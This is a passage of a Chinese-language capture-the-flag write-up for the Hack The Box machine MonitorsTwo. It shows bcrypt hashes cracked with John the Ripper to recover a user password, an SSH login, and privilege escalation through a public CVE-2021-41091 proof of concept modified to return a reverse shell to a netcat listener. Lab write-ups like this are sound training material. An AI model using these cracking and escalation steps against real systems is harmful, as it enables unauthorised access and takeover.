+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>admin:<span class="nv">$2</span>y<span class="nv">$10$IhEA</span>.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>guest:43e9a4ab75570f5b
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>marcus:<span class="nv">$2</span>y<span class="nv">$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1</span>.3WeKlBn70JonsdW/MhFYK4C
+</span></code></pre></div></p>
+<p>姑且这3个都用JTR跑一下。<br />
+一开始直接运行 <code>john</code> 没有指定format跑了一阵觉得不对，好奇查了一下 <code>$2y$10$</code>，似乎是PHP的hash算法。继续搜搜 <code>john the ripper $2y$10$</code>，发现<a href="https://security.stackexchange.com/questions/243981/for-bcrypt-why-is-jtr-so-much-faster-than-hashcat">这篇文章</a>，看来按照这样指定好些：
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>└─$<span class="w"> </span>john<span class="w"> </span>--format<span class="o">=</span>bcrypt<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>user_auth_fromSQL.txt
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>Using<span class="w"> </span>default<span class="w"> </span>input<span class="w"> </span>encoding:<span class="w"> </span>UTF-8
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>Loaded<span class="w"> </span><span class="m">2</span><span class="w"> </span>password<span class="w"> </span>hashes<span class="w"> </span>with<span class="w"> </span><span class="m">2</span><span class="w"> </span>different<span class="w"> </span>salts<span class="w"> </span><span class="o">(</span>bcrypt<span class="w"> </span><span class="o">[</span>Blowfish<span class="w"> </span><span class="m">32</span>/64<span class="w"> </span>X3<span class="o">])</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>Cost<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>iteration<span class="w"> </span>count<span class="o">)</span><span class="w"> </span>is<span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>all<span class="w"> </span>loaded<span class="w"> </span>hashes
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>Will<span class="w"> </span>run<span class="w"> </span><span class="m">8</span><span class="w"> </span>OpenMP<span class="w"> </span>threads
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>Press<span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span>or<span class="w"> </span>Ctrl-C<span class="w"> </span>to<span class="w"> </span>abort,<span class="w"> </span>almost<span class="w"> </span>any<span class="w"> </span>other<span class="w"> </span>key<span class="w"> </span><span class="k">for</span><span class="w"> </span>status
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>funkymonkey<span class="w">      </span><span class="o">(</span>marcus<span class="o">)</span><span class="w"> </span>
+</span></code></pre></div></p>
+<p>结果先暴破出来了marcus的密码。</p>
+<h2 id="flag-user">flag: user<a class="headerlink" href="#flag-user" title="Permanent link">&para;</a></h2>
+<p>按之前的思路先试试SSH连接，成功：
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>└─$<span class="w"> </span>ssh<span class="w"> </span>marcus@10.10.11.211<span class="w"> </span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>……
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>Last<span class="w"> </span>login:<span class="w"> </span>Sun<span class="w"> </span>May<span class="w"> </span><span class="m">14</span><span class="w"> </span><span class="m">22</span>:09:32<span class="w"> </span><span class="m">2023</span><span class="w"> </span>from<span class="w"> </span><span class="m">10</span>.10.14.67
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>marcus@monitorstwo:~$<span class="w"> </span>id
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>marcus<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>marcus<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>marcus<span class="o">)</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>marcus@monitorstwo:~$<span class="w"> </span>ls
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>user.txt
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>marcus@monitorstwo:~$<span class="w"> </span>cat<span class="w"> </span>user.txt<span class="w"> </span>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>846a…………ada0
+</span></code></pre></div></p>
+<p>看来admin就暴破不出来了，停掉john暴破开始探索目标主机。</p>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<h3 id="_4">探索<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<ul>
+<li>无sudo</li>
+<li>SUID无法利用</li>
+<li>cron</li>
+<li>查看可写文件</li>
+<li>查看nginx配置文件</li>
+<li>LinPEAS枚举</li>
+</ul>
+<p>都试了试感觉不行……中间查到nginx配置文件发现虚拟主机的域名时还兴奋了一下以为这么简单，结果写入hosts文件访问后就是最开始那个web网站。</p>
+<p>迷茫……在官方论坛看了半天，终于看到有个人说注意连接ssh时的消息…………<br />
+我无语</p>
+<p>于是终于找到线索：
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>marcus@monitorstwo:/var/mail$<span class="w"> </span>cat<span class="w"> </span>marcus<span class="w"> </span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>From:<span class="w"> </span>administrator@monitorstwo.htb
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>To:<span class="w"> </span>all@monitorstwo.htb
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>Subject:<span class="w"> </span>Security<span class="w"> </span>Bulletin<span class="w"> </span>-<span class="w"> </span>Three<span class="w"> </span>Vulnerabilities<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>Aware<span class="w"> </span>Of
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>Dear<span class="w"> </span>all,
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>We<span class="w"> </span>would<span class="w"> </span>like<span class="w"> </span>to<span class="w"> </span>bring<span class="w"> </span>to<span class="w"> </span>your<span class="w"> </span>attention<span class="w"> </span>three<span class="w"> </span>vulnerabilities<span class="w"> </span>that<span class="w"> </span>have<span class="w"> </span>been<span class="w"> </span>recently<span class="w"> </span>discovered<span class="w"> </span>and<span class="w"> </span>should<span class="w"> </span>be<span class="w"> </span>addressed<span class="w"> </span>as<span class="w"> </span>soon<span class="w"> </span>as<span class="w"> </span>possible.
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>CVE-2021-33033:<span class="w"> </span>This<span class="w"> </span>vulnerability<span class="w"> </span>affects<span class="w"> </span>the<span class="w"> </span>Linux<span class="w"> </span>kernel<span class="w"> </span>before<span class="w"> </span><span class="m">5</span>.11.14<span class="w"> </span>and<span class="w"> </span>is<span class="w"> </span>related<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>CIPSO<span class="w"> </span>and<span class="w"> </span>CALIPSO<span class="w"> </span>refcounting<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>DOI<span class="w"> </span>definitions.<span class="w"> </span>Attackers<span class="w"> </span>can<span class="w"> </span>exploit<span class="w"> </span>this<span class="w"> </span>use-after-free<span class="w"> </span>issue<span class="w"> </span>to<span class="w"> </span>write<span class="w"> </span>arbitrary<span class="w"> </span>values.<span class="w"> </span>Please<span class="w"> </span>update<span class="w"> </span>your<span class="w"> </span>kernel<span class="w"> </span>to<span class="w"> </span>version<span class="w"> </span><span class="m">5</span>.11.14<span class="w"> </span>or<span class="w"> </span>later<span class="w"> </span>to<span class="w"> </span>address<span class="w"> </span>this<span class="w"> </span>vulnerability.
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a>CVE-2020-25706:<span class="w"> </span>This<span class="w"> </span>cross-site<span class="w"> </span>scripting<span class="w"> </span><span class="o">(</span>XSS<span class="o">)</span><span class="w"> </span>vulnerability<span class="w"> </span>affects<span class="w"> </span>Cacti<span class="w"> </span><span class="m">1</span>.2.13<span class="w"> </span>and<span class="w"> </span>occurs<span class="w"> </span>due<span class="w"> </span>to<span class="w"> </span>improper<span class="w"> </span>escaping<span class="w"> </span>of<span class="w"> </span>error<span class="w"> </span>messages<span class="w"> </span>during<span class="w"> </span>template<span class="w"> </span>import<span class="w"> </span>previews<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>xml_path<span class="w"> </span>field.<span class="w"> </span>This<span class="w"> </span>could<span class="w"> </span>allow<span class="w"> </span>an<span class="w"> </span>attacker<span class="w"> </span>to<span class="w"> </span>inject<span class="w"> </span>malicious<span class="w"> </span>code<span class="w"> </span>into<span class="w"> </span>the<span class="w"> </span>webpage,<span class="w"> </span>potentially<span class="w"> </span>resulting<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>theft<span class="w"> </span>of<span class="w"> </span>sensitive<span class="w"> </span>data<span class="w"> </span>or<span class="w"> </span>session<span class="w"> </span>hijacking.<span class="w"> </span>Please<span class="w"> </span>upgrade<span class="w"> </span>to<span class="w"> </span>Cacti<span class="w"> </span>version<span class="w"> </span><span class="m">1</span>.2.14<span class="w"> </span>or<span class="w"> </span>later<span class="w"> </span>to<span class="w"> </span>address<span class="w"> </span>this<span class="w"> </span>vulnerability.
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>CVE-2021-41091:<span class="w"> </span>This<span class="w"> </span>vulnerability<span class="w"> </span>affects<span class="w"> </span>Moby,<span class="w"> </span>an<span class="w"> </span>open-source<span class="w"> </span>project<span class="w"> </span>created<span class="w"> </span>by<span class="w"> </span>Docker<span class="w"> </span><span class="k">for</span><span class="w"> </span>software<span class="w"> </span>containerization.<span class="w"> </span>Attackers<span class="w"> </span>could<span class="w"> </span>exploit<span class="w"> </span>this<span class="w"> </span>vulnerability<span class="w"> </span>by<span class="w"> </span>traversing<span class="w"> </span>directory<span class="w"> </span>contents<span class="w"> </span>and<span class="w"> </span>executing<span class="w"> </span>programs<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>data<span class="w"> </span>directory<span class="w"> </span>with<span class="w"> </span>insufficiently<span class="w"> </span>restricted<span class="w"> </span>permissions.<span class="w"> </span>The<span class="w"> </span>bug<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>fixed<span class="w"> </span><span class="k">in</span><span class="w"> </span>Moby<span class="w"> </span><span class="o">(</span>Docker<span class="w"> </span>Engine<span class="o">)</span><span class="w"> </span>version<span class="w"> </span><span class="m">20</span>.10.9,<span class="w"> </span>and<span class="w"> </span>users<span class="w"> </span>should<span class="w"> </span>update<span class="w"> </span>to<span class="w"> </span>this<span class="w"> </span>version<span class="w"> </span>as<span class="w"> </span>soon<span class="w"> </span>as<span class="w"> </span>possible.<span class="w"> </span>Please<span class="w"> </span>note<span class="w"> </span>that<span class="w"> </span>running<span class="w"> </span>containers<span class="w"> </span>should<span class="w"> </span>be<span class="w"> </span>stopped<span class="w"> </span>and<span class="w"> </span>restarted<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>permissions<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span>fixed.
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>
+</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>We<span class="w"> </span>encourage<span class="w"> </span>you<span class="w"> </span>to<span class="w"> </span>take<span class="w"> </span>the<span class="w"> </span>necessary<span class="w"> </span>steps<span class="w"> </span>to<span class="w"> </span>address<span class="w"> </span>these<span class="w"> </span>vulnerabilities<span class="w"> </span>promptly<span class="w"> </span>to<span class="w"> </span>avoid<span class="w"> </span>any<span class="w"> </span>potential<span class="w"> </span>security<span class="w"> </span>breaches.<span class="w"> </span>If<span class="w"> </span>you<span class="w"> </span>have<span class="w"> </span>any<span class="w"> </span>questions<span class="w"> </span>or<span class="w"> </span>concerns,<span class="w"> </span>please<span class="w"> </span><span class="k">do</span><span class="w"> </span>not<span class="w"> </span>hesitate<span class="w"> </span>to<span class="w"> </span>contact<span class="w"> </span>our<span class="w"> </span>IT<span class="w"> </span>department.
+</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a>
+</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a>Best<span class="w"> </span>regards,
+</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a>
+</span><span id="__span-11-20"><a id="__codelineno-11-20" name="__codelineno-11-20" href="#__codelineno-11-20"></a>Administrator
+</span><span id="__span-11-21"><a id="__codelineno-11-21" name="__codelineno-11-21" href="#__codelineno-11-21"></a>CISO
+</span><span id="__span-11-22"><a id="__codelineno-11-22" name="__codelineno-11-22" href="#__codelineno-11-22"></a>Monitor<span class="w"> </span>Two
+</span><span id="__span-11-23"><a id="__codelineno-11-23" name="__codelineno-11-23" href="#__codelineno-11-23"></a>Security<span class="w"> </span>Team
+</span></code></pre></div></p>
+<h3 id="poc-cve-2021-41091">PoC (<a href="https://github.com/UncleJ4ck/CVE-2021-41091">CVE-2021-41091</a>)<a class="headerlink" href="#poc-cve-2021-41091" title="Permanent link">&para;</a></h3>
+<p>找到PoC就很简单了。</p>
+<p>注意，由于PoC的脚本执行完之后会自动退出shell。所以要修改一下PoC里对应位置的命令，使其执行反向shell即可。</p>
+<h2 id="flag-root">flag: root<a class="headerlink" href="#flag-root" title="Permanent link">&para;</a></h2>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>└─$<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4445</span><span class="w"> </span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">4445</span><span class="w"> </span>...
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.xx<span class="w"> </span>.xx.xx<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.10.11.211<span class="o">]</span><span class="w"> </span><span class="m">56864</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>bash-5.1#<span class="w"> </span>id
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>id
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>marcus<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>marcus<span class="o">)</span><span class="w"> </span><span class="nv">euid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>marcus<span class="o">)</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>bash-5.1#<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/root
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="nb">cd</span><span class="w"> </span>/root
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>bash-5.1#<span class="w"> </span>ls
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>ls
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>cacti
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>root.txt
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>bash-5.1#<span class="w"> </span>cat<span class="w"> </span>root.txt
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>cat<span class="w"> </span>root.txt
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>dfbf…………52af
+</span></code></pre></div>
+<hr />
+<h2 id="_5">总结·后记<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<p>2023/05/15</p>
+<p>虽然也有卡住的地方，但是总体来说确实不难。<br />
+初始访问很容易就能顺着web服务的版本号去找exp，不过还是感受到了自己这个脚本小子的水平，拿着exp就想直接用，没太考虑了解漏洞原理。不过自己确实web方面较弱，代码的阅读量也少，感觉看CVE文章啃很久都不一定反应过来原来是用X-Forwarded-For等于环回IP去绕过验证。</p>
+<p>一开始在kali搜漏洞的时候没搜出来觉得很奇怪，才想起来应该是有个数据库之类的需要更新？于是也顺便更新了ExploitDB和metasplit：</p>
+<ul>
+<li><code>searchsploit -u</code></li>
+<li><code>apt update; apt install metasploit-framework</code></li>
+</ul>
+<p>然后就是docker容器，最初进去的时候想看IP发现没有安装<code>ifconfig</code>命令，然后搜了些替代命令如<code>ip a</code>也没有。直接开摆，要不是偶然连上Meterpreter跑了下<code>sysinfo</code>，也不知道自己会过多久才发现身处容器中……<br />
+以及一直都是走一步想一步，由于没有好好地探索信息而被骗进兔子洞，白白在docker里拿了没用的root权限。</p>
+<p>最后一个提权的利用实际上不难。感觉所有难点都在如何发现那条提示……SSH登陆后的信息，一直以来都是无视的啊……这台机器的创作者简直就是利用了人的这个习惯（笑）。以及如官方论坛有人说的那样，“What happens in Vegas does not always stay in Vegas”，有点意思。</p>
+<p>总的来说，信息收集要仔细！</p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["navigation.tabs", "navigation.tabs.sticky", "navigation.top", "navigation.path", "navigation.expand", "search.suggest", "search.highlight", "search.share", "content.code.copy", "header.autohide", "toc.follow"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../../static/js/extra.js"></script>
+      
+    
+  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
+</html>
